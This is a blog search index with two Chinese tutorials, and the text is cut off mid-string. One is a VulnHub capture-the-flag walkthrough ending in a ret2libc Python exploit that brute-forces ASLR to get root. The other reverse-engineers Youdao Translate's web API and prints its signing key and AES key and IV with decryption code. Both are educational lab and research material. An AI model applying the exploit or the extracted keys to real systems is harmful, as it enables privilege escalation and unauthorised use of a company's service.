<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vulnhub:deathstar_1</title>
    <link href="/2025/05/29/vulnhub-deathstar_1/"/>
    <url>/2025/05/29/vulnhub-deathstar_1/</url>
    
    <content type="html"><![CDATA[<p>网址：<a href="https://www.vulnhub.com/entry/death-star-1,477/">https://www.vulnhub.com/entry/death-star-1,477/</a></p><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><h4 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h4><p><img src="/../img/vulnhub-deathstar_1.md/1.png"></p><p>解压压缩包。</p><p><img src="/../img/vulnhub-deathstar_1.md/2.png"></p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>在 Vmware 左上角“文件”–&gt;“打开”–&gt;选择“DeathStart_1.ovf”即可</p><p>启动虚拟机</p><p><img src="/../img/vulnhub-deathstar_1.md/3.png"></p><h1 id="攻入"><a href="#攻入" class="headerlink" title="攻入"></a>攻入</h1><h2 id="nmap-探测开放端口"><a href="#nmap-探测开放端口" class="headerlink" title="nmap 探测开放端口"></a>nmap 探测开放端口</h2><p>打开 kali，nmap 扫描网段，找到靶机 ip：192.168.17.254</p><p><img src="/../img/vulnhub-deathstar_1.md/4.png"></p><p>可以联通靶机</p><p><img src="/../img/vulnhub-deathstar_1.md/5.png"></p><p><strong>全端口扫描</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/6.png"></p><p>没有结果….</p><p><strong>添加-f 参数进行数据包分片</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/7.png"></p><p>没有结果….</p><p><strong>源端口伪装</strong></p><p>将源端口伪装成 dns</p><p><img src="/../img/vulnhub-deathstar_1.md/8.png"></p><p>没有结果….</p><p><strong>按顺序扫描（nmap 默认是随机扫描）</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/9.png"></p><p>没有结果….</p><p><strong>修改 TCP 标志</strong></p><p>猜测防火墙仅过滤特定的 syn 扫描，若使用 urg、psh、fin 这三个标志进行发送可能不过滤</p><p><img src="/../img/vulnhub-deathstar_1.md/10.png"></p><p>没有结果….</p><p><strong>测试 UDP</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/11.png"></p><p>仅开放&#x2F;过滤 dhcp，没什么用</p><p>至此 nmap 探测没有什么效果，尝试使用抓取网络流量</p><h2 id="网络流量抓取"><a href="#网络流量抓取" class="headerlink" title="网络流量抓取"></a>网络流量抓取</h2><p>查看网卡</p><p><img src="/../img/vulnhub-deathstar_1.md/12.png"></p><p>使用 tshark（tshark 就是 wires hark 的命令行版本）</p><p><img src="/../img/vulnhub-deathstar_1.md/13.png"></p><p><em><strong>发现：靶机每 60s 向外发送一次数据包</strong></em></p><p>__</p><p>查看截获的数据包：</p><p><img src="/../img/vulnhub-deathstar_1.md/14.png"></p><p>观察到数据包中的 ASCII 码，尝试提取</p><p><img src="/../img/vulnhub-deathstar_1.md/15.png"></p><p><img src="/../img/vulnhub-deathstar_1.md/16.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>xxd常用于调试、文件内容分析和数据转换，用来把文件或标准输入的文件转化成16进制或者二进制（－d参数）<br>-r：将十六进制数据还原为二进制（反向操作）。<br>-p：以连续的纯十六进制形式（不带偏移地址和 ASCII）输出。<br>-c cols：每行输出多少个字节，默认为 16。<br>-g bytes：每组显示多少字节，默认为 2。<br>-s offset：从文件的某个偏移位置开始读取（支持负数表示从文件末尾开始）。<br>-l length：只显示指定长度的字节。<br>-u：将输出的十六进制字符转为大写。<br>-i：以 C 语言的数组格式输出。<br>-b：将输出转换为二进制格式，而不是十六进制。<br></code></pre></td></tr></table></figure><p>将数据包中的 ASCII 提取，转译，得到以下提示内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>Code to access the Death Star Blueprint<br>within the time it takes to reload is:  DS-1@OBS     <br><br><br>Thanks to the successful Operation Skyhook, the Rebel Alliance<br>got some plans for the new weapon of the Galactic Empire. We<br>know that there is a small opening that we can explore through a<br>thermal exhaust that is directly connected to the Main Reactor of the<br>Death Star. The superlaser takes 1440 minutes to reload.<br>It is very important to observe &#x27;this window&#x27; in order to recover the blueprint.<br>This is because, it is only possible to make an attempt every 60 seconds.<br><br>翻译：<br>访问死星蓝图的代码（需在重新装填时间内输入）：DS-1@OBS<br><br>得益于&quot;天钩行动&quot;的成功，义军同盟获得了银河帝国新式武器的部分设计图。我们已发现一个可通过热排气口进入的小型通道，该通道直通死星的主反应堆。超级激光炮需要1440分钟重新装填。<br>必须密切把握&quot;这个窗口期&quot;才能获取蓝图。<br>因为系统每60秒才允许尝试一次。<br></code></pre></td></tr></table></figure><h4 id="锁定-1440-端口"><a href="#锁定-1440-端口" class="headerlink" title="锁定 1440 端口"></a>锁定 1440 端口</h4><p>提示中提到了 1440 和 60，这俩可能是俩开放的端口，nmap 扫描</p><p><img src="/../img/vulnhub-deathstar_1.md/17.png"></p><p>nmap 成功扫描到了 1440 开放端口</p><h4 id="nc-连接"><a href="#nc-连接" class="headerlink" title="nc 连接"></a>nc 连接</h4><p><img src="/../img/vulnhub-deathstar_1.md/18.png"></p><p><strong>想到提示</strong>：访问死星蓝图的代码（需在重新装填时间内输入）：DS-1@OBS</p><p>:::info<br>echo “DS-1@OBS” | nc -u 192.168.17.143 1440 | tee mass</p><p>:::</p><p><img src="/../img/vulnhub-deathstar_1.md/19.png"></p><h4 id="对-mass-分析"><a href="#对-mass-分析" class="headerlink" title="对 mass 分析"></a>对 mass 分析</h4><p>看起来像 base64 </p><p><img src="/../img/vulnhub-deathstar_1.md/20.png"></p><p>打开图像（open x）</p><p><img src="/../img/vulnhub-deathstar_1.md/21.png"></p><h2 id="对-Blueprint-图进行分析"><a href="#对-Blueprint-图进行分析" class="headerlink" title="对 Blueprint 图进行分析"></a>对 Blueprint 图进行分析</h2><h4 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h4><p>steghide（一款强大的隐写术工具<a href="https://labex.io/zh/tutorials/hide-data-in-steghide-549941">https://labex.io/zh/tutorials/hide-data-in-steghide-549941</a>）</p><p><img src="/../img/vulnhub-deathstar_1.md/22.png"></p><p><strong>解锁码的每个分段必须由3个字符组成，按顺序发送方可开启10110端口。</strong></p><h2 id="端口敲门"><a href="#端口敲门" class="headerlink" title="端口敲门"></a>端口敲门</h2><p>nmap 查看 10110 端口的状态</p><p><img src="/../img/vulnhub-deathstar_1.md/23.png"></p><p>过滤态</p><h4 id="knock"><a href="#knock" class="headerlink" title="knock"></a>knock</h4><p><img src="/../img/vulnhub-deathstar_1.md/24.png"></p><p>查看 10110 端口的服务信息</p><p><img src="/../img/vulnhub-deathstar_1.md/25.png"></p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p><img src="/../img/vulnhub-deathstar_1.md/26.png"></p><p>问 ChatGpt，得到密码：lyra13</p><p><img src="/../img/vulnhub-deathstar_1.md/27.png"></p><p>有提示：</p><p><img src="/../img/vulnhub-deathstar_1.md/28.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>来自盖伦·厄索的讯息：<br><br>这是你的机会。摧毁银河帝国的计划。我知道维达勋爵绝不会乐见此事。但，这将是我赎罪的机会。希望你们掌握足够的知识来协助摧毁这件新武器。<br><br>探索系统并获取&quot;root权限&quot;，读取位于&quot;/root/message.txt&quot;的秘密信息。<br><br>不成功便成仁！！<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>列出系统中所有设置了 SUID 或 SGID 权限的可执行文件。</p><p><img src="/../img/vulnhub-deathstar_1.md/29.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/34357387/1748500125418-ac5135ae-cd2c-45bb-8bde-167776b2ca31.png"></p><h4 id="dartVader-分析"><a href="#dartVader-分析" class="headerlink" title="dartVader 分析"></a>dartVader 分析</h4><p>查看&#x2F;bin&#x2F;dartVader</p><p><img src="/../img/vulnhub-deathstar_1.md/30.png"></p><p><img src="/../img/vulnhub-deathstar_1.md/31.png"></p><p>提示：dartVader: 你在这里有未来。别当个菜鸟，去真正寻找并学习…</p><p><img src="/../img/vulnhub-deathstar_1.md/32.png"></p><p>查看包含字符串：</p><p><img src="/../img/vulnhub-deathstar_1.md/33.png"></p><p>该文件是一个 elf 文件，将文件提取到 kali</p><p>:::info<br>scp -P 10110 <a href="mailto:&#101;&#x72;&#115;&#x6f;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#x37;&#46;&#49;&#52;&#51;">erso@192.168.17.143</a>:&#x2F;bin&#x2F;dartVader .</p><p>:::</p><p>使用 kali 中 gdb 和 gdb-peda</p><p><img src="/../img/vulnhub-deathstar_1.md/34.png"></p><p><strong>开启了 NX 保护</strong>(checksec 讲解：<a href="https://bbs.kanxue.com/thread-250538.htm">https://bbs.kanxue.com/thread-250538.htm</a>)</p><p>反汇编 main 函数：</p><p><img src="/../img/vulnhub-deathstar_1.md/35.png"></p><p><strong>发现使用了不安全的反汇编函数 strcpy，而且没有验证长度！</strong></p><h4 id="测试是否存在缓冲区溢出漏洞"><a href="#测试是否存在缓冲区溢出漏洞" class="headerlink" title="测试是否存在缓冲区溢出漏洞"></a>测试是否存在缓冲区溢出漏洞</h4><p><img src="/../img/vulnhub-deathstar_1.md/36.png"></p><p>没有输出</p><p>搜索靶机是否有 python 环境</p><p><img src="/../img/vulnhub-deathstar_1.md/37.png"></p><p>当命令行输入 100 个 A 时候，触发报错：</p><p><img src="/../img/vulnhub-deathstar_1.md/38.png"></p><p>查看日志</p><p><img src="/../img/vulnhub-deathstar_1.md/39.png"></p><p>确定 sp 寄存器的地址：bff03670</p><p><strong>根据 41414141 确定存在缓冲区溢出漏洞</strong></p><hr><p><strong>readelf 查看文件详情（scanelf -e dartVader 也可以）</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/40.png"></p><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p><img src="/../img/vulnhub-deathstar_1.md/41.png"></p><h5 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h5><p>可以看到每一次地址都是变化的，确认存在 ASLR，但是变化的地址都离的很近</p><p><img src="/../img/vulnhub-deathstar_1.md/42.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">地址空间布局随机化（ASLR）可以帮助克服某些类型的缓冲区溢出攻击，ASLR可以将基数，库，堆和堆栈放在进程地址空间中的任意随机位置，这使攻击程序很难预测下一条指令的内存地址。<br>ASLR内置在Linux内核中，并由参数控制 /proc/sys/kernel/randomize_va_space,该 randomize_va_space参数可以采用以下值：<br>  0 : 禁用ASLR。如果使用norandmapsboot参数引导内核，则将应用此设置。<br>  1 : 随机化堆栈，虚拟动态共享对象（VDSO）页面和共享内存区域的位置。数据段的基地址位于可执行代码段的结尾之后。<br>  2 : 随机化堆栈，VDSO页，共享内存区域和数据段的位置。这是默认设置。<br></code></pre></td></tr></table></figure><p><img src="/../img/vulnhub-deathstar_1.md/43.png"></p><p>看看当前用户可否关闭 ASLR</p><p><img src="/../img/vulnhub-deathstar_1.md/44.png"></p><h6 id="绕过-ASLR"><a href="#绕过-ASLR" class="headerlink" title="绕过 ASLR"></a>绕过 ASLR</h6><p>撞 ASLR 地址，为什么撞？因为该 elf 程序是 32 位的，可以在使用更复杂的方法之前尝试一下</p><p><strong>找偏移地址：</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/45.png"></p><p><img src="/../img/vulnhub-deathstar_1.md/46.png"></p><p>libc 地址：0xb7603000</p><p>exit@@GLIBC_2.0 地址：00033260</p><p>system@@GLIBC_2.0 地址：00040310</p><p>使用 sh 不用 bash，找 sh 的地址：（防止因 bash 的安全机制拿不到 shell）</p><p><img src="/../img/vulnhub-deathstar_1.md/47.png"></p><h3 id="总结利用逻辑"><a href="#总结利用逻辑" class="headerlink" title="总结利用逻辑"></a>总结利用逻辑</h3><p>发现 dartVader 是一个由 <strong>root</strong> 拥有的二进制文件，初步简单<strong>交互无法实现提权</strong>；</p><p>通过<strong>反编译</strong>分析，观察到程序中存在<strong>缓冲区溢出漏洞（strcpy）</strong>，因为程序开启了 NX 保护，栈区不可执行 shellcode；</p><p>通过** ldd <strong>发现了程序链接了 libc 动态链接库，尝试使用</strong> ret2libc 攻击**，通过<strong>调用库中已有的函数 system，绕过程序的 nx 保护；</strong></p><p>但是目标环境启用了 <strong>ASLR</strong>，导致内存地址随机化，但是地址变化范围较小，尝试使用<strong>碰撞</strong>地址，绕过 ASLR；</p><p>通过构造 <strong>rop 链</strong>并循环猜测出 system 函数的地址，然后<strong>在 system 函数中执行 shell 命令</strong>，试图提权；</p><p>通过推测 libc 的基地址和 system 等函数的偏移关系，然后利用这一关系在循环中复现正确的内存布局，尝试命中目标地址。</p><h4 id="地址碰撞"><a href="#地址碰撞" class="headerlink" title="地址碰撞"></a>地址碰撞</h4><p><img src="/../img/vulnhub-deathstar_1.md/48.png"></p><p>锁定偏移为 76</p><p>最终 ret2libc.py 脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python3<br># -*- coding:utf-8 -*-<br>from struct import pack<br>from subprocess import call<br><br>offset = b&quot;A&quot; * 76<br>libc = 0xb7603000<br>system = pack(&quot;&lt;I&quot;,libc + 0x00040310)<br>exit = pack(&quot;&lt;I&quot;,libc + 0x00033260)<br>sh = pack(&quot;&lt;I&quot;,libc + 0x162d4c)<br>buffer  = offset + system + exit + sh<br>app = b&quot;/bin/dartVader&quot;<br><br>for i in range(1024):<br>    print(&quot;Attempt %d&quot; % i)<br>    ret = call ([app,buffer])<br>    if ret == 0:<br>        print(&quot;Exploit Successful!&quot;)<br>        break<br>else:<br>    print(&quot;Mission failed&quot;)<br>    <br></code></pre></td></tr></table></figure><p>碰撞地址过程：</p><p><img src="/../img/vulnhub-deathstar_1.md/49.png"></p><p>成功 get root！</p><p><img src="/../img/vulnhub-deathstar_1.md/50.png"></p><p>查看&#x2F;root&#x2F;message.txt 文件</p><p><img src="/../img/vulnhub-deathstar_1.md/51.png"></p><p>Congratulations！！</p><p>参考：</p><p>红队笔记（讲的很好）：<a href="https://www.bilibili.com/video/BV1c8EEznEkv?spm_id_from=333.788.videopod.sections&vd_source=4e9106e7030f1c25677827558da5c605">https://www.bilibili.com/video/BV1c8EEznEkv?spm_id_from&#x3D;333.788.videopod.sections&amp;vd_source&#x3D;4e9106e7030f1c25677827558da5c605</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub靶场</tag>
      
      <tag>图片隐写</tag>
      
      <tag>端口敲门</tag>
      
      <tag>ASLR绕过</tag>
      
      <tag>ret2libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某道逆向（翻译软件）</title>
    <link href="/2025/05/26/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91/"/>
    <url>/2025/05/26/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>目标：<a href="https://fanyi.youdao.com/#/TextTranslate">https://fanyi.youdao.com/#/TextTranslate</a></p><h3 id="Pawto">开始分析</h3>抓取得三个包，可看出来是 aes 加密<p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/1.png"></p><p>sign 和时间戳是变化的</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/2.png"></p><h3 id="LTkUz">逆sign</h3><h4 id="QQ0to">1. 搜索 sign</h4><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/3.png"></p><p>根据数据包中的 sign 周围的变量来定位 sign，若断点打不到本行就不是，接着往下找</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/4.png"></p><p>再次翻译，成功断到此处</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/5.png"></p><h4 id="BxQQJ">2.sign(a,e)</h4>a 为：a = (new Date).getTime();<p>e 不知道是什么</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/6.png"></p><p>运行后 e 出了新结果</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/7.png"></p><p>说明 sign(a,e)函数会运行两次</p><p>查看网络中的 sign</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/8.png"></p><p>看最终使用的是第一次的 sign 还是第二次的。</p><p>S 函数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/9.png"></p><p>通过对 1 进行加密判断加密模式是不是 md5</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/10.png"></p><p>client、product、key 的值是固定的</p><h4 id="JOGSR">sign 解密代码</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">CryptoJs</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto-js&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getsign</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">const</span> a = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>).<span class="hljs-title function_">getTime</span>();<br><br>    test = <span class="hljs-string">`client=fanyideskweb&amp;mysticTime=<span class="hljs-subst">$&#123;a&#125;</span>&amp;product=webfanyi&amp;key=Vy4EQ1uwPkUoqvcP1nIu6WiAjxFeA3Y3`</span><br>    sign = <span class="hljs-title class_">CryptoJs</span>.<span class="hljs-title class_">MD5</span>(test).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">return</span> [a,sign]<br><br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getsign</span>());<br><br></code></pre></td></tr></table></figure><h3 id="WPU0g">逆 webtranslate</h3><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/11.png"></p><p>看到一大串数据无从下手，三种可能：</p><p>JSON.parse</p><p>decrypt</p><p>join</p><p>:::</p><p>定位：</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/12.png"></p><p>da.A.decodeData(o, ha.A.state.text.decodeKey, ha.A.state.text.decodeIv)的结果已经是 json 字符串了</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/13.png"></p><p>分析 json 解密的函数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/14.png"></p><p>传入 e   t   a 三个参数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/15.png"></p><p>const o 和 n 为固定值</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/16.png"></p><p>目前 js 状态：</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/17.png"></p><p>arg 为 O 函数传入的 e</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/18.png"></p><h3 id="uBPVj">Py 脚本</h3><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/19.png"></p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/20.png"></p><h4 id="Lfn38">得到密文</h4><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/21.png"></p><p>运行 py 脚本，得到值（这个值是服务器传给客户端的密文）</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/22.png"></p><h4 id="nUGim">解密</h4><p>调用 js 的解密函数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/23.png"></p><p>运行 py</p><p>终端就可以进行翻译了~</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">CryptoJs</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto-js&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getsign</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> a = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>).<span class="hljs-title function_">getTime</span>();<br><br>    test = <span class="hljs-string">`client=fanyideskweb&amp;mysticTime=<span class="hljs-subst">$&#123;a&#125;</span>&amp;product=webfanyi&amp;key=Vy4EQ1uwPkUoqvcP1nIu6WiAjxFeA3Y3`</span><br>    sign = <span class="hljs-title class_">CryptoJs</span>.<span class="hljs-title class_">MD5</span>(test).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">return</span> [a, sign]<br><br>&#125;<br><span class="hljs-comment">//console.log(getsign());</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">translate_response</span>(<span class="hljs-params">text</span>) &#123;<br>    <span class="hljs-comment">// text 是 base64 字符串</span><br>    <span class="hljs-keyword">const</span> key = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>([<span class="hljs-number">8</span>, <span class="hljs-number">20</span>, <span class="hljs-number">157</span>, <span class="hljs-number">167</span>, <span class="hljs-number">60</span>, <span class="hljs-number">89</span>, <span class="hljs-number">206</span>, <span class="hljs-number">98</span>, <span class="hljs-number">85</span>, <span class="hljs-number">91</span>, <span class="hljs-number">1</span>, <span class="hljs-number">233</span>, <span class="hljs-number">47</span>, <span class="hljs-number">52</span>, <span class="hljs-number">232</span>, <span class="hljs-number">56</span>]);<br>    <span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>([<span class="hljs-number">210</span>, <span class="hljs-number">187</span>, <span class="hljs-number">27</span>, <span class="hljs-number">253</span>, <span class="hljs-number">232</span>, <span class="hljs-number">59</span>, <span class="hljs-number">56</span>, <span class="hljs-number">195</span>, <span class="hljs-number">68</span>, <span class="hljs-number">54</span>, <span class="hljs-number">99</span>, <span class="hljs-number">87</span>, <span class="hljs-number">183</span>, <span class="hljs-number">156</span>, <span class="hljs-number">174</span>, <span class="hljs-number">28</span>]);<br>    <span class="hljs-keyword">const</span> decipher = crypto.<span class="hljs-title function_">createDecipheriv</span>(<span class="hljs-string">&#x27;aes-128-cbc&#x27;</span>, key, iv);<br>    <span class="hljs-keyword">let</span> decrypted = decipher.<span class="hljs-title function_">update</span>(text, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>    decrypted += decipher.<span class="hljs-title function_">final</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(decrypted);<br>&#125;<br><br><span class="hljs-comment">//arg = &#x27;Z21kD9ZK1ke6ugku2ccWu4n6eLnvoDT0YgGi0y3g-v0B9sYqg8L9D6UERNozYOHqnYdl2efZNyM6Trc_xS-zKtfTK4hb6JP8XwCzNh0avc8qItQUiIU_4wKKXJlIpvMvfKvJaaZzaX6VEtpkr2FdkfoT_Jgbm2GRSVj3r40autIdlImENG8hC0ZH4ww7utwuTt3Oo_ZpXg0BSq9wePSAB75-ChkiGKF9HTIPeCl2bl84SBD1XDfFCZpkKQhecYSs0JLoXOqP2ltavxRrg58Hp1q5uIgZZ_Oo2-Jmd-t1r4es40drcAq5bjmS62M2VJF8D6ojtOh9JTfNwgzD3CxYn-Pd7-TgHMyNEJEkFXTAyxzpjlFqtrCYDE3SZUYlENkqsL8Wrra1hM-1nTfiB-BLcWAdRBynNpP5_54aq_-GBsq8bB_9yEX5ovzDB4_Ry_spVVuUnb39iplMHCdCnjOD3ngiIDbl9SUz-9npjBX05ZYRdPmFPAl424qdoaxeVqnVoH8jQFPZVqaHMzu4mJg0SICDWFH7GP1zqGRbXd3ESjT_iBInl3gICt2XVuhh_nubcELkTEC6xbqEDRQkPUNMpzXJHjcvsLHtcmSW0S9F0445ho9kT2qZYdMBC3Fs0OaHpUtFu77gZpQn7sGiqh8VliXIcUtfvvop-1c-Vu5QjfUbLn2-s5POR9fGYG6rt6ioe_PGmwWj-Cc00zUM7FybfarKTr4D3Rk57R72qpXN4Ja86ZsCAMmDG-m5z31RQh_V7echJ8Kna3Go3yWKCK4vtSwOWrFhiS5RTz6EkrGc3SkFKbb5vp8Wop_84myBtgnBmj4CczhTq2HcOxrJf4def6yDt2uBxyv4bTVGx9Yx3uB4Gx0iK5kYvfma6B_LnkRWk331wjuXKQtBGYIuWkR8J5QtvBmIRVaa7AA19Z4xMIEAqbcuQ5p4I9FCElthBrJdtEr4l29PhwKfsA7pYeU2EJLRrRK42WQpEy0Xwx_2Lz2e3Rlf-L467aRO7RmuvBXD-J_H0IwaArTP7K3_ZeSUzEvCicixstp94kzkLHCsyJHZXiR3YTq3t7lmNgpfDbb-&#x27;</span><br><span class="hljs-comment">//console.log(translate_response(&#x27;Z21kD9ZK1ke6ugku2ccWu4n6eLnvoDT0YgGi0y3g-v0B9sYqg8L9D6UERNozYOHqnYdl2efZNyM6Trc_xS-zKtfTK4hb6JP8XwCzNh0avc8qItQUiIU_4wKKXJlIpvMvfKvJaaZzaX6VEtpkr2FdkfoT_Jgbm2GRSVj3r40autIdlImENG8hC0ZH4ww7utwuTt3Oo_ZpXg0BSq9wePSAB75-ChkiGKF9HTIPeCl2bl84SBD1XDfFCZpkKQhecYSs0JLoXOqP2ltavxRrg58Hp1q5uIgZZ_Oo2-Jmd-t1r4es40drcAq5bjmS62M2VJF8D6ojtOh9JTfNwgzD3CxYn-Pd7-TgHMyNEJEkFXTAyxzpjlFqtrCYDE3SZUYlENkqsL8Wrra1hM-1nTfiB-BLcWAdRBynNpP5_54aq_-GBsq8bB_9yEX5ovzDB4_Ry_spVVuUnb39iplMHCdCnjOD3ngiIDbl9SUz-9npjBX05ZYRdPmFPAl424qdoaxeVqnVoH8jQFPZVqaHMzu4mJg0SICDWFH7GP1zqGRbXd3ESjT_iBInl3gICt2XVuhh_nubcELkTEC6xbqEDRQkPUNMpzXJHjcvsLHtcmSW0S9F0445ho9kT2qZYdMBC3Fs0OaHpUtFu77gZpQn7sGiqh8VliXIcUtfvvop-1c-Vu5QjfUbLn2-s5POR9fGYG6rt6ioe_PGmwWj-Cc00zUM7FybfarKTr4D3Rk57R72qpXN4Ja86ZsCAMmDG-m5z31RQh_V7echJ8Kna3Go3yWKCK4vtSwOWrFhiS5RTz6EkrGc3SkFKbb5vp8Wop_84myBtgnBmj4CczhTq2HcOxrJf4def6yDt2uBxyv4bTVGx9Yx3uB4Gx0iK5kYvfma6B_LnkRWk331wjuXKQtBGYIuWkR8J5QtvBmIRVaa7AA19Z4xMIEAqbcuQ5p4I9FCElthBrJdtEr4l2